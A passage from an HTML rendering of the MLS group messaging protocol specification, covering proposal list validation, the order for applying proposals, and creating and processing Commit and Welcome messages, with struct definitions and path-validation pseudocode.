          <li id="section-12.2-6.2">At most one Remove proposal, with which the joiner removes an
old version of themselves. If a Remove proposal is present, then the LeafNode in the
<code>path</code> field of the external Commit <span>MUST</span> meet the same criteria as would the LeafNode
in an Update for the removed leaf (see <a href="#update">Section 12.1.2</a>). In particular, the <code>credential</code>
in the LeafNode <span>MUST</span> present a set of identifiers that is acceptable to the
application for the removed participant.<a href="#section-12.2-6.2">¬∂</a>
</li>
          <li id="section-12.2-6.3">Zero or more PreSharedKey proposals<a href="#section-12.2-6.3">¬∂</a>
</li>
          <li id="section-12.2-6.4">No other proposals<a href="#section-12.2-6.4">¬∂</a>
</li>
        </ul>
<p id="section-12.2-7">Proposal types defined in the future may make updates to the above validation
logic to incorporate considerations related to proposals of the new type.<a href="#section-12.2-7">¬∂</a></p>
</section>
<section id="applying-a-proposal-list">
        <h3 id="name-applying-a-proposal-list">
<a href="#section-12.3">12.3. </a><a href="#name-applying-a-proposal-list">Applying a Proposal List</a>
        </h3>
<p id="section-12.3-1">The sections above defining each proposal type describe how each individual
proposal is applied.  When creating or processing a Commit, a client applies a
list of proposals to the ratchet tree and GroupContext. The client <span>MUST</span> apply
the proposals in the list in the following order:<a href="#section-12.3-1">¬∂</a></p>
<ul>
<li id="section-12.3-2.1">If there is a GroupContextExtensions proposal, replace the <code>extensions</code> field
of the GroupContext for the group with the contents of the proposal.  The
new <code>extensions</code> <span>MUST</span> be used when evaluating other proposals in this list. For
example, if a GroupContextExtensions proposal adds a <code>required_capabilities</code>
extension, then any Add proposals need to indicate support for those
capabilities.<a href="#section-12.3-2.1">¬∂</a>
</li>
          <li id="section-12.3-2.2">Apply any Update proposals to the ratchet tree, in any order.<a href="#section-12.3-2.2">¬∂</a>
</li>
          <li id="section-12.3-2.3">Apply any Remove proposals to the ratchet tree, in any order.<a href="#section-12.3-2.3">¬∂</a>
</li>
          <li id="section-12.3-2.4">Apply any Add proposals to the ratchet tree, in the order they appear in the list.<a href="#section-12.3-2.4">¬∂</a>
</li>
          <li id="section-12.3-2.5">Look up the PSK secrets for any PreSharedKey proposals, in the order they
appear in the list.  These secrets are then used to advance the key schedule
later in Commit processing.<a href="#section-12.3-2.5">¬∂</a>
</li>
          <li id="section-12.3-2.6">If there is an ExternalInit proposal, use it to derive the <code>init_secret</code> for
use later in Commit processing.<a href="#section-12.3-2.6">¬∂</a>
</li>
          <li id="section-12.3-2.7">If there is a ReInit proposal, note its parameters for application later in
Commit processing.<a href="#section-12.3-2.7">¬∂</a>
</li>
        </ul>
<p id="section-12.3-3">Proposal types defined in the future <span>MUST</span> specify how the above steps are to be
adjusted to accommodate the application of proposals of the new type.<a href="#section-12.3-3">¬∂</a></p>
</section>
<section id="commit">
        <h3 id="name-commit">
<a href="#section-12.4">12.4. </a><a href="#name-commit">Commit</a>
        </h3>
<p id="section-12.4-1">A Commit message initiates a new epoch for the group, based on a collection of
Proposals. It instructs group members to update their representation of the
state of the group by applying the proposals and advancing the key schedule.<a href="#section-12.4-1">¬∂</a></p>
<p id="section-12.4-2">Each proposal covered by the Commit is included by a ProposalOrRef value, which
identifies the proposal to be applied by value or by reference.  Commits that
refer to new Proposals from the committer can be included by value. Commits
for previously sent proposals from anyone (including the committer) can be sent
by reference.  Proposals sent by reference are specified by including the hash of
the AuthenticatedContent object in which the proposal was sent (see <a href="#hash-based-identifiers">Section 5.2</a>).<a href="#section-12.4-2">¬∂</a></p>
<div id="section-12.4-3">
<pre>enum {
  reserved(0),
  proposal(1),
  reference(2),
  (255)
} ProposalOrRefType;

struct {
  ProposalOrRefType type;
  select (ProposalOrRef.type) {
    case proposal:  Proposal proposal;
    case reference: ProposalRef reference;
  };
} ProposalOrRef;

struct {
    ProposalOrRef proposals&lt;V&gt;;
    optional&lt;UpdatePath&gt; path;
} Commit;
</pre><p><a href="#section-12.4-3">¬∂</a>
</p></div>
<p id="section-12.4-4">A group member that has observed one or more valid proposals within an epoch <span>MUST</span> send
a Commit message before sending application data. This ensures, for example,
that any members whose removal was proposed during the epoch are actually
removed before any application data is transmitted.<a href="#section-12.4-4">¬∂</a></p>
<p id="section-12.4-5">A sender and a receiver of a Commit <span>MUST</span> verify that the committed list of
proposals is valid as specified in <a href="#proposal-list-validation">Section 12.2</a>. A list is invalid if, for example,
it includes an Update and a Remove for the same member, or an Add when the sender does not have
the application-level permission to add new users.<a href="#section-12.4-5">¬∂</a></p>
<p id="section-12.4-6">The sender of a Commit <span>SHOULD</span> include all proposals that it has received
during the current epoch that are valid according to the rules for their
proposal types and according to application policy, as long as this results in
a valid proposal list.<a href="#section-12.4-6">¬∂</a></p>
<p id="section-12.4-7">Due to the asynchronous nature of proposals, receivers of a Commit <span>SHOULD NOT</span> enforce
that all valid proposals sent within the current epoch are referenced by the next
Commit. In the event that a valid proposal is omitted from the next Commit, and
that proposal is still valid in the current epoch, the sender of the proposal
<span>MAY</span> resend it after updating it to reflect the current epoch.<a href="#section-12.4-7">¬∂</a></p>
<p id="section-12.4-8">A member of the group <span>MAY</span> send a Commit that references no proposals at all,
which would thus have an empty <code>proposals</code> vector.  Such
a Commit resets the sender's leaf and the nodes along its direct path, and
provides forward secrecy and post-compromise security with regard to the sender
of the Commit.  An Update proposal can be regarded as a "lazy" version of this
operation, where only the leaf changes and intermediate nodes are blanked out.<a href="#section-12.4-8">¬∂</a></p>
<p id="section-12.4-9">By default, the <code>path</code> field of a Commit <span>MUST</span> be populated.  The <code>path</code> field
<span>MAY</span> be omitted if (a) it covers at least one proposal and (b) none of the proposals
covered by the Commit are of "path required" types.  A proposal type requires a
path if it cannot change the group membership in a way that requires the forward
secrecy and post-compromise security guarantees that an UpdatePath provides.
The only proposal types defined in this document that do not require a path are:<a href="#section-12.4-9">¬∂</a></p>
<ul>
<li id="section-12.4-10.1">
            <code>add</code><a href="#section-12.4-10.1">¬∂</a>
</li>
          <li id="section-12.4-10.2">
            <code>psk</code><a href="#section-12.4-10.2">¬∂</a>
</li>
          <li id="section-12.4-10.3">
            <code>reinit</code><a href="#section-12.4-10.3">¬∂</a>
</li>
        </ul>
<p id="section-12.4-11">New proposal types <span>MUST</span> state whether they require a path. If any instance of a
proposal type requires a path, then the proposal type requires a path. This
attribute of a proposal type is reflected in the "Path Required" field of the
"MLS Proposal Types" registry defined in <a href="#mls-proposal-types">Section 17.4</a>.<a href="#section-12.4-11">¬∂</a></p>
<p id="section-12.4-12">Update and Remove proposals are the clearest examples of proposals that require
a path.  An UpdatePath is required to evict the removed member or the old
appearance of the updated member.<a href="#section-12.4-12">¬∂</a></p>
<p id="section-12.4-13">In pseudocode, the logic for validating the <code>path</code> field of a Commit is as
follows:<a href="#section-12.4-13">¬∂</a></p>
<div id="section-12.4-14">
<pre>pathRequiredTypes = [
    update,
    remove,
    external_init,
    group_context_extensions
]

pathRequired = false

for proposal in commit.proposals:
    pathRequired = pathRequired ||
                   (proposal.msg_type in pathRequiredTypes)

if len(commit.proposals) == 0 || pathRequired:
    assert(commit.path != null)
</pre><p><a href="#section-12.4-14">¬∂</a>
</p></div>
<p id="section-12.4-15">To summarize, a Commit can have three different configurations, with different
uses:<a href="#section-12.4-15">¬∂</a></p>
<ol start="1" type="1" id="section-12.4-16">
          <li id="section-12.4-16.1">An "empty" Commit that references no proposals, which updates the committer's
contribution to the group and provides PCS with regard to the committer.<a href="#section-12.4-16.1">¬∂</a>
</li>
          <li id="section-12.4-16.2">A "partial" Commit that references proposals that do not require a path, and
where the path is empty. Such a Commit doesn't provide PCS with regard to the
committer.<a href="#section-12.4-16.2">¬∂</a>
</li>
          <li id="section-12.4-16.3">A "full" Commit that references proposals of any type, which provides FS with
regard to any removed members and PCS for the committer and any updated
members.<a href="#section-12.4-16.3">¬∂</a>
</li>
        </ol>
<section id="creating-a-commit">
          <h4 id="name-creating-a-commit">
<a href="#section-12.4.1">12.4.1. </a><a href="#name-creating-a-commit">Creating a Commit</a>
          </h4>
<p id="section-12.4.1-1">When creating or processing a Commit, a client updates the ratchet tree and
GroupContext for the group.  These values advance from an "old" state reflecting
the current epoch to a "new" state reflecting the new epoch initiated by the
Commit.  When the Commit includes an UpdatePath, a "provisional" group context
is constructed that reflects changes due to the proposals and UpdatePath, but
with the old confirmed transcript hash.<a href="#section-12.4.1-1">¬∂</a></p>
<p id="section-12.4.1-2">A member of the group creates a Commit message and the corresponding Welcome
message at the same time, by taking the following steps:<a href="#section-12.4.1-2">¬∂</a></p>
<ul>
<li id="section-12.4.1-3.1">Verify that the list of proposals to be committed is valid as specified in
<a href="#proposal-list-validation">Section 12.2</a>.<a href="#section-12.4.1-3.1">¬∂</a>
</li>
            <li id="section-12.4.1-3.2">Construct an initial Commit object with the <code>proposals</code> field populated from
Proposals received during the current epoch, and with the <code>path</code> field empty.<a href="#section-12.4.1-3.2">¬∂</a>
</li>
            <li id="section-12.4.1-3.3">Create the new ratchet tree and GroupContext by applying the list of proposals
to the old ratchet tree and GroupContext, as defined in
<a href="#applying-a-proposal-list">Section 12.3</a>.<a href="#section-12.4.1-3.3">¬∂</a>
</li>
            <li id="section-12.4.1-3.4">Decide whether to populate the <code>path</code> field: If the <code>path</code> field is required
based on the proposals that are in the Commit (see above), then it <span>MUST</span> be
populated.  Otherwise, the sender <span>MAY</span> omit the <code>path</code> field at its discretion.<a href="#section-12.4.1-3.4">¬∂</a>
</li>
            <li id="section-12.4.1-3.5">
              <p id="section-12.4.1-3.5.1">If populating the <code>path</code> field:<a href="#section-12.4.1-3.5.1">¬∂</a></p>
<ul>
<li id="section-12.4.1-3.5.2.1">If this is an external Commit, assign the sender the leftmost blank leaf
node in the new ratchet tree.  If there are no blank leaf nodes in the new
ratchet tree, expand the tree to the right as defined in
<a href="#adding-and-removing-leaves">Section 7.7</a> and assign the leftmost new blank leaf to the
sender.<a href="#section-12.4.1-3.5.2.1">¬∂</a>
</li>
                <li id="section-12.4.1-3.5.2.2">Update the sender's direct path in the ratchet tree as described in
<a href="#synchronizing-views-of-the-tree">Section 7.5</a>.  Define
<code>commit_secret</code> as the value <code>path_secret[n+1]</code> derived from the
last path secret value (<code>path_secret[n]</code>) derived for the UpdatePath.<a href="#section-12.4.1-3.5.2.2">¬∂</a>
</li>
                <li id="section-12.4.1-3.5.2.3">
                  <p id="section-12.4.1-3.5.2.3.1">Construct a provisional GroupContext object containing the following values:<a href="#section-12.4.1-3.5.2.3.1">¬∂</a></p>
<ul>
<li id="section-12.4.1-3.5.2.3.2.1">
                      <code>group_id</code>: Same as the old GroupContext<a href="#section-12.4.1-3.5.2.3.2.1">¬∂</a>
</li>
                    <li id="section-12.4.1-3.5.2.3.2.2">
                      <code>epoch</code>: The epoch number for the new epoch<a href="#section-12.4.1-3.5.2.3.2.2">¬∂</a>
</li>
                    <li id="section-12.4.1-3.5.2.3.2.3">
                      <code>tree_hash</code>: The tree hash of the new ratchet tree<a href="#section-12.4.1-3.5.2.3.2.3">¬∂</a>
</li>
                    <li id="section-12.4.1-3.5.2.3.2.4">
                      <code>confirmed_transcript_hash</code>: Same as the old GroupContext<a href="#section-12.4.1-3.5.2.3.2.4">¬∂</a>
</li>
                    <li id="section-12.4.1-3.5.2.3.2.5">
                      <code>extensions</code>: The new GroupContext extensions (possibly updated by a
GroupContextExtensions proposal)<a href="#section-12.4.1-3.5.2.3.2.5">¬∂</a>
</li>
                  </ul>
</li>
                <li id="section-12.4.1-3.5.2.4">Encrypt the path secrets resulting from the tree update to the group as
described in <a href="#synchronizing-views-of-the-tree">Section 7.5</a>, using the provisional
group context as the context for HPKE encryption.<a href="#section-12.4.1-3.5.2.4">¬∂</a>
</li>
                <li id="section-12.4.1-3.5.2.5">Create an UpdatePath containing the sender's new leaf node and the new
public keys and encrypted path secrets along the sender's filtered direct
path.  Assign this UpdatePath to the <code>path</code> field in the Commit.<a href="#section-12.4.1-3.5.2.5">¬∂</a>
</li>
              </ul>
</li>
            <li id="section-12.4.1-3.6">If not populating the <code>path</code> field: Set the <code>path</code> field in the Commit to the
null optional.  Define <code>commit_secret</code> as the all-zero vector of length
<code>KDF.Nh</code> (the same length as a <code>path_secret</code> value would be).<a href="#section-12.4.1-3.6">¬∂</a>
</li>
            <li id="section-12.4.1-3.7">Derive the <code>psk_secret</code> as specified in <a href="#pre-shared-keys">Section 8.4</a>, where the order
of PSKs in the derivation corresponds to the order of PreSharedKey proposals
in the <code>proposals</code> vector.<a href="#section-12.4.1-3.7">¬∂</a>
</li>
            <li id="section-12.4.1-3.8">
              <p id="section-12.4.1-3.8.1">Construct a FramedContent object containing the Commit object. Sign the
FramedContent using the old GroupContext as context.<a href="#section-12.4.1-3.8.1">¬∂</a></p>
<ul>
<li id="section-12.4.1-3.8.2.1">Use the FramedContent to update the confirmed transcript hash and update
the new GroupContext.<a href="#section-12.4.1-3.8.2.1">¬∂</a>
</li>
                <li id="section-12.4.1-3.8.2.2">Use the <code>init_secret</code> from the previous epoch, the <code>commit_secret</code> and
<code>psk_secret</code> defined in the previous steps, and the new GroupContext to
compute the new <code>joiner_secret</code>, <code>welcome_secret</code>, <code>epoch_secret</code>, and
derived secrets for the new epoch.<a href="#section-12.4.1-3.8.2.2">¬∂</a>
</li>
                <li id="section-12.4.1-3.8.2.3">Use the <code>confirmation_key</code> for the new epoch to compute the
<code>confirmation_tag</code> value.<a href="#section-12.4.1-3.8.2.3">¬∂</a>
</li>
                <li id="section-12.4.1-3.8.2.4">Calculate the interim transcript hash using the new confirmed transcript
hash and the <code>confirmation_tag</code> from the FramedContentAuthData.<a href="#section-12.4.1-3.8.2.4">¬∂</a>
</li>
              </ul>
</li>
            <li id="section-12.4.1-3.9">
              <p id="section-12.4.1-3.9.1">Protect the AuthenticatedContent object using keys from the old epoch:<a href="#section-12.4.1-3.9.1">¬∂</a></p>
<ul>
<li id="section-12.4.1-3.9.2.1">If encoding as PublicMessage, compute the <code>membership_tag</code> value using the
<code>membership_key</code>.<a href="#section-12.4.1-3.9.2.1">¬∂</a>
</li>
                <li id="section-12.4.1-3.9.2.2">If encoding as a PrivateMessage, encrypt the message using the
<code>sender_data_secret</code> and the next (key, nonce) pair from the sender's
handshake ratchet.<a href="#section-12.4.1-3.9.2.2">¬∂</a>
</li>
              </ul>
</li>
            <li id="section-12.4.1-3.10">
              <p id="section-12.4.1-3.10.1">Construct a GroupInfo reflecting the new state:<a href="#section-12.4.1-3.10.1">¬∂</a></p>
<ul>
<li id="section-12.4.1-3.10.2.1">Set the <code>group_id</code>, <code>epoch</code>, <code>tree</code>, <code>confirmed_transcript_hash</code>,
<code>interim_transcript_hash</code>, and <code>group_context_extensions</code> fields to reflect
the new state.<a href="#section-12.4.1-3.10.2.1">¬∂</a>
</li>
                <li id="section-12.4.1-3.10.2.2">Set the <code>confirmation_tag</code> field to the value of the corresponding field in
the FramedContentAuthData object.<a href="#section-12.4.1-3.10.2.2">¬∂</a>
</li>
                <li id="section-12.4.1-3.10.2.3">Add any other extensions as defined by the application.<a href="#section-12.4.1-3.10.2.3">¬∂</a>
</li>
                <li id="section-12.4.1-3.10.2.4">Optionally derive an external key pair as described in <a href="#key-schedule">Section 8</a>.
(required for external Commits, see <a href="#joining-via-external-commits">Section 12.4.3.2</a>).<a href="#section-12.4.1-3.10.2.4">¬∂</a>
</li>
                <li id="section-12.4.1-3.10.2.5">Sign the GroupInfo using the member's private signing key.<a href="#section-12.4.1-3.10.2.5">¬∂</a>
</li>
                <li id="section-12.4.1-3.10.2.6">Encrypt the GroupInfo using the key and nonce derived from the <code>joiner_secret</code>.
for the new epoch (see <a href="#joining-via-welcome-message">Section 12.4.3.1</a>).<a href="#section-12.4.1-3.10.2.6">¬∂</a>
</li>
              </ul>
</li>
            <li id="section-12.4.1-3.11">
              <p id="section-12.4.1-3.11.1">For each new member in the group:<a href="#section-12.4.1-3.11.1">¬∂</a></p>
<ul>
<li id="section-12.4.1-3.11.2.1">Identify the lowest common ancestor in the tree of the new member's
leaf node and the member sending the Commit.<a href="#section-12.4.1-3.11.2.1">¬∂</a>
</li>
                <li id="section-12.4.1-3.11.2.2">If the <code>path</code> field was populated above: Compute the path secret
corresponding to the common ancestor node.<a href="#section-12.4.1-3.11.2.2">¬∂</a>
</li>
                <li id="section-12.4.1-3.11.2.3">Compute an EncryptedGroupSecrets object that encapsulates the <code>init_secret</code>
for the current epoch and the path secret (if present).<a href="#section-12.4.1-3.11.2.3">¬∂</a>
</li>
              </ul>
</li>
            <li id="section-12.4.1-3.12">Construct one or more Welcome messages from the encrypted GroupInfo object,
the encrypted key packages, and any PSKs for which a proposal was included in
the Commit. The order of the <code>psks</code> <span>MUST</span> be the same as the order of
PreSharedKey proposals in the <code>proposals</code> vector.  As discussed in
<a href="#joining-via-welcome-message">Section 12.4.3.1</a>, the committer is free to choose how many
Welcome messages to construct.  However, the set of Welcome messages produced
in this step <span>MUST</span> cover every new member added in the Commit.<a href="#section-12.4.1-3.12">¬∂</a>
</li>
            <li id="section-12.4.1-3.13">
              <p id="section-12.4.1-3.13.1">If a ReInit proposal was part of the Commit, the committer <span>MUST</span> create a new
group with the parameters specified in the ReInit proposal,
and with the same members as the original group.
The Welcome message <span>MUST</span> include a PreSharedKeyID with the following
parameters:<a href="#section-12.4.1-3.13.1">¬∂</a></p>
<ul>
<li id="section-12.4.1-3.13.2.1">
                  <code>psktype</code>: <code>resumption</code><a href="#section-12.4.1-3.13.2.1">¬∂</a>
</li>
                <li id="section-12.4.1-3.13.2.2">
                  <code>usage</code>: <code>reinit</code><a href="#section-12.4.1-3.13.2.2">¬∂</a>
</li>
                <li id="section-12.4.1-3.13.2.3">
                  <code>group_id</code>: The group ID for the current group<a href="#section-12.4.1-3.13.2.3">¬∂</a>
</li>
                <li id="section-12.4.1-3.13.2.4">
                  <code>epoch</code>: The epoch that the group will be in after this Commit<a href="#section-12.4.1-3.13.2.4">¬∂</a>
</li>
              </ul>
</li>
          </ul>
</section>
<section id="processing-a-commit">
          <h4 id="name-processing-a-commit">
<a href="#section-12.4.2">12.4.2. </a><a href="#name-processing-a-commit">Processing a Commit</a>
          </h4>
<p id="section-12.4.2-1">A member of the group applies a Commit message by taking the following steps:<a href="#section-12.4.2-1">¬∂</a></p>
<ul>
<li id="section-12.4.2-2.1">Verify that the <code>epoch</code> field of the enclosing FramedContent is equal
to the <code>epoch</code> field of the current GroupContext object.<a href="#section-12.4.2-2.1">¬∂</a>
</li>
            <li id="section-12.4.2-2.2">
              <p id="section-12.4.2-2.2.1">Unprotect the Commit using the keys from the current epoch:<a href="#section-12.4.2-2.2.1">¬∂</a></p>
<ul>
<li id="section-12.4.2-2.2.2.1">If the message is encoded as PublicMessage, verify the membership MAC using
the <code>membership_key</code>.<a href="#section-12.4.2-2.2.2.1">¬∂</a>
</li>
                <li id="section-12.4.2-2.2.2.2">If the message is encoded as PrivateMessage, decrypt the message using the
<code>sender_data_secret</code> and the (key, nonce) pair from the step on the sender's
hash ratchet indicated by the <code>generation</code> field.<a href="#section-12.4.2-2.2.2.2">¬∂</a>
</li>
              </ul>
</li>
            <li id="section-12.4.2-2.3">Verify the signature on the FramedContent message as described in
<a href="#content-authentication">Section 6.1</a>.<a href="#section-12.4.2-2.3">¬∂</a>
</li>
            <li id="section-12.4.2-2.4">Verify that the <code>proposals</code> vector is valid according to the rules in
<a href="#proposal-list-validation">Section 12.2</a>.<a href="#section-12.4.2-2.4">¬∂</a>
</li>
            <li id="section-12.4.2-2.5">Verify that all PreSharedKey proposals in the <code>proposals</code> vector are available.<a href="#section-12.4.2-2.5">¬∂</a>
</li>
            <li id="section-12.4.2-2.6">Create the new ratchet tree and GroupContext by applying the list of proposals
to the old ratchet tree and GroupContext, as defined in
<a href="#applying-a-proposal-list">Section 12.3</a>.<a href="#section-12.4.2-2.6">¬∂</a>
</li>
            <li id="section-12.4.2-2.7">Verify that the <code>path</code> value is populated if the <code>proposals</code> vector contains
any Update or Remove proposals, or if it's empty. Otherwise, the <code>path</code> value
<span>MAY</span> be omitted.<a href="#section-12.4.2-2.7">¬∂</a>
</li>
            <li id="section-12.4.2-2.8">
              <p id="section-12.4.2-2.8.1">If the <code>path</code> value is populated, validate it and apply it to the tree:<a href="#section-12.4.2-2.8.1">¬∂</a></p>
<ul>
<li id="section-12.4.2-2.8.2.1">If this is an external Commit, assign the sender the leftmost blank leaf
node in the new ratchet tree.  If there are no blank leaf nodes in the new
ratchet tree, add a blank leaf to the right side of the new ratchet tree and
assign it to the sender.<a href="#section-12.4.2-2.8.2.1">¬∂</a>
</li>
                <li id="section-12.4.2-2.8.2.2">Validate the LeafNode as specified in <a href="#leaf-node-validation">Section 7.3</a>.  The
<code>leaf_node_source</code> field <span>MUST</span> be set to <code>commit</code>.<a href="#section-12.4.2-2.8.2.2">¬∂</a>
</li>
                <li id="section-12.4.2-2.8.2.3">Verify that the <code>encryption_key</code> value in the LeafNode is different from the
committer's current leaf node.<a href="#section-12.4.2-2.8.2.3">¬∂</a>
</li>
                <li id="section-12.4.2-2.8.2.4">Verify that none of the public keys in the UpdatePath appear in any node of
the new ratchet tree.<a href="#section-12.4.2-2.8.2.4">¬∂</a>
</li>
                <li id="section-12.4.2-2.8.2.5">Merge the UpdatePath into the new ratchet tree, as described in
<a href="#synchronizing-views-of-the-tree">Section 7.5</a>.<a href="#section-12.4.2-2.8.2.5">¬∂</a>
</li>
                <li id="section-12.4.2-2.8.2.6">
                  <p id="section-12.4.2-2.8.2.6.1">Construct a provisional GroupContext object containing the following values:<a href="#section-12.4.2-2.8.2.6.1">¬∂</a></p>
<ul>
<li id="section-12.4.2-2.8.2.6.2.1">
                      <code>group_id</code>: Same as the old GroupContext<a href="#section-12.4.2-2.8.2.6.2.1">¬∂</a>
</li>
                    <li id="section-12.4.2-2.8.2.6.2.2">
                      <code>epoch</code>: The epoch number for the new epoch<a href="#section-12.4.2-2.8.2.6.2.2">¬∂</a>
</li>
                    <li id="section-12.4.2-2.8.2.6.2.3">
                      <code>tree_hash</code>: The tree hash of the new ratchet tree<a href="#section-12.4.2-2.8.2.6.2.3">¬∂</a>
</li>
                    <li id="section-12.4.2-2.8.2.6.2.4">
                      <code>confirmed_transcript_hash</code>: Same as the old GroupContext<a href="#section-12.4.2-2.8.2.6.2.4">¬∂</a>
</li>
                    <li id="section-12.4.2-2.8.2.6.2.5">
                      <code>extensions</code>: The new GroupContext extensions (possibly updated by a
GroupContextExtensions proposal)<a href="#section-12.4.2-2.8.2.6.2.5">¬∂</a>
</li>
                  </ul>
</li>
                <li id="section-12.4.2-2.8.2.7">Decrypt the path secrets for UpdatePath as described in
<a href="#synchronizing-views-of-the-tree">Section 7.5</a>, using the provisional GroupContext as
the context for HPKE decryption.<a href="#section-12.4.2-2.8.2.7">¬∂</a>
</li>
                <li id="section-12.4.2-2.8.2.8">Define <code>commit_secret</code> as the value <code>path_secret[n+1]</code> derived from the
last path secret value (<code>path_secret[n]</code>) derived for the UpdatePath.<a href="#section-12.4.2-2.8.2.8">¬∂</a>
</li>
              </ul>
</li>
            <li id="section-12.4.2-2.9">If the <code>path</code> value is not populated, define <code>commit_secret</code> as the all-zero
vector of length <code>KDF.Nh</code> (the same length as a <code>path_secret</code> value would be).<a href="#section-12.4.2-2.9">¬∂</a>
</li>
            <li id="section-12.4.2-2.10">Update the confirmed and interim transcript hashes using the new Commit, and
generate the new GroupContext.<a href="#section-12.4.2-2.10">¬∂</a>
</li>
            <li id="section-12.4.2-2.11">Derive the <code>psk_secret</code> as specified in <a href="#pre-shared-keys">Section 8.4</a>, where the order
of PSKs in the derivation corresponds to the order of PreSharedKey proposals
in the <code>proposals</code> vector.<a href="#section-12.4.2-2.11">¬∂</a>
</li>
            <li id="section-12.4.2-2.12">Use the <code>init_secret</code> from the previous epoch, the <code>commit_secret</code> and
<code>psk_secret</code> defined in the previous steps, and the new GroupContext to
compute the new <code>joiner_secret</code>, <code>welcome_secret</code>, <code>epoch_secret</code>, and
derived secrets for the new epoch.<a href="#section-12.4.2-2.12">¬∂</a>
</li>
            <li id="section-12.4.2-2.13">Use the <code>confirmation_key</code> for the new epoch to compute the confirmation tag
for this message, as described below, and verify that it is the same as the
<code>confirmation_tag</code> field in the FramedContentAuthData object.<a href="#section-12.4.2-2.13">¬∂</a>
</li>
            <li id="section-12.4.2-2.14">If the above checks are successful, consider the new GroupContext object
as the current state of the group.<a href="#section-12.4.2-2.14">¬∂</a>
</li>
            <li id="section-12.4.2-2.15">If the Commit included a ReInit proposal, the client <span>MUST NOT</span> use the group to
send messages anymore. Instead, it <span>MUST</span> wait for a Welcome message from the committer
meeting the requirements of <a href="#reinitialization">Section 11.2</a>.<a href="#section-12.4.2-2.15">¬∂</a>
</li>
          </ul>
<p id="section-12.4.2-3">Note that clients need to be prepared to receive a valid Commit message that removes
them from the group. In this case, the client cannot send any more messages in the
group and <span>SHOULD</span> promptly delete its group state and secret tree. (A client might keep
the secret tree for a short time to decrypt late messages in the previous epoch.)<a href="#section-12.4.2-3">¬∂</a></p>
</section>
<section id="adding-members-to-the-group">
          <h4 id="name-adding-members-to-the-group">
<a href="#section-12.4.3">12.4.3. </a><a href="#name-adding-members-to-the-group">Adding Members to the Group</a>
          </h4>
<p id="section-12.4.3-1">New members can join the group in two ways: by being added by a group
member or by adding themselves through an external Commit. In both cases, the
new members need information to bootstrap their local group state.<a href="#section-12.4.3-1">¬∂</a></p>
<div id="section-12.4.3-2">
<pre>struct {
    GroupContext group_context;
    Extension extensions&lt;V&gt;;
    MAC confirmation_tag;
    uint32 signer;
    /* SignWithLabel(., "GroupInfoTBS", GroupInfoTBS) */
    opaque signature&lt;V&gt;;
} GroupInfo;
</pre><p><a href="#section-12.4.3-2">¬∂</a>
</p></div>
<p id="section-12.4.3-3">The <code>group_context</code> field represents the current state of the group.  The
<code>extensions</code> field allows the sender to provide additional data that might be
useful to new joiners.  The <code>confirmation_tag</code> represents the  confirmation tag
from the Commit that initiated the current epoch, or for epoch 0, the
confirmation tag computed in the creation of the group (see <a href="#group-creation">Section 11</a>).
(In either case, the creator of a GroupInfo may recompute the confirmation tag
as <code>MAC(confirmation_key, confirmed_transcript_hash)</code>.)<a href="#section-12.4.3-3">¬∂</a></p>
<p id="section-12.4.3-4">As discussed in <a href="#extensibility">Section 13</a>, unknown extensions in <code>GroupInfo.extensions</code> <span>MUST</span> be ignored, and the creator of a GroupInfo object <span>SHOULD</span> include some
random GREASE extensions to help ensure that other clients correctly ignore unknown
extensions.  Extensions in <code>GroupInfo.group_context.extensions</code>, however, <span>MUST</span>
be supported by the new joiner.<a href="#section-12.4.3-4">¬∂</a></p>
<p id="section-12.4.3-5">New members <span>MUST</span> verify that <code>group_id</code> is unique among the groups they are
currently participating in.<a href="#section-12.4.3-5">¬∂</a></p>
<p id="section-12.4.3-6">New members also <span>MUST</span> verify the <code>signature</code> using the public key taken from the
leaf node of the ratchet tree with leaf index <code>signer</code>. The
signature covers the following structure, comprising all the fields in the
GroupInfo above <code>signature</code>:<a href="#section-12.4.3-6">¬∂</a></p>
<div id="section-12.4.3-7">
<pre>struct {
    GroupContext group_context;
    Extension extensions&lt;V&gt;;
    MAC confirmation_tag;
    uint32 signer;
} GroupInfoTBS;
</pre><p><a href="#section-12.4.3-7">¬∂</a>
</p></div>
<section id="joining-via-welcome-message">
            <h5 id="name-joining-via-welcome-message">
<a href="#section-12.4.3.1">12.4.3.1. </a><a href="#name-joining-via-welcome-message">Joining via Welcome Message</a>
            </h5>
<p id="section-12.4.3.1-1">The sender of a Commit message is responsible for sending a Welcome message to
each new member added via Add proposals.  The format of the Welcome message
allows a single Welcome message to be encrypted for multiple new members.  It is
up to the committer to decide how many Welcome messages to create for a given
Commit. The committer could create one Welcome that is encrypted for all new
members, a different Welcome for each new member, or Welcome messages for
batches of new members (according to some batching scheme that works well for
the application).  The processes for creating and processing the Welcome are the
same in all cases, aside from the set of new members for whom a given Welcome is
encrypted.<a href="#section-12.4.3.1-1">¬∂</a></p>
<p id="section-12.4.3.1-2">The Welcome message provides the new
members with the current state of the group after the application of the Commit
message.  The new members will not be able to decrypt or verify the Commit
message, but they will have the secrets they need to participate in the epoch
initiated by the Commit message.<a href="#section-12.4.3.1-2">¬∂</a></p>
<p id="section-12.4.3.1-3">In order to allow the same Welcome message to be sent to multiple new members,
information describing the group is encrypted with a symmetric key and nonce
derived from the <code>joiner_secret</code> for the new epoch.  The <code>joiner_secret</code> is
then encrypted to each new member using HPKE.  In the same encrypted package,
the committer transmits the path secret for the lowest (closest to the leaf) node
that is contained in the direct paths of both the committer and the new member.
This allows the new
member to compute private keys for nodes in its direct path that are being
reset by the corresponding Commit.<a href="#section-12.4.3.1-3">¬∂</a></p>
<p id="section-12.4.3.1-4">If the sender of the Welcome message wants the receiving member to include a PSK
in the derivation of the <code>epoch_secret</code>, they can populate the <code>psks</code> field
indicating which PSK to use.<a href="#section-12.4.3.1-4">¬∂</a></p>
<div id="section-12.4.3.1-5">
<pre>struct {
  opaque path_secret&lt;V&gt;;
} PathSecret;

struct {
  opaque joiner_secret&lt;V&gt;;
  optional&lt;PathSecret&gt; path_secret;
  PreSharedKeyID psks&lt;V&gt;;
} GroupSecrets;

struct {
  KeyPackageRef new_member;
  HPKECiphertext encrypted_group_secrets;
} EncryptedGroupSecrets;

struct {
  CipherSuite cipher_suite;
  EncryptedGroupSecrets secrets&lt;V&gt;;
  opaque encrypted_group_info&lt;V&gt;;
} Welcome;
</pre><p><a href="#section-12.4.3.1-5">¬∂</a>
</p></div>
<p id="section-12.4.3.1-6">The client processing a Welcome message will need to have a copy of the group's
ratchet tree.  The tree can be provided in the Welcome message, in an extension
of type <code>ratchet_tree</code>.  If it is sent otherwise (e.g., provided by a caching
service on the Delivery Service), then the client <span>MUST</span> download the tree before
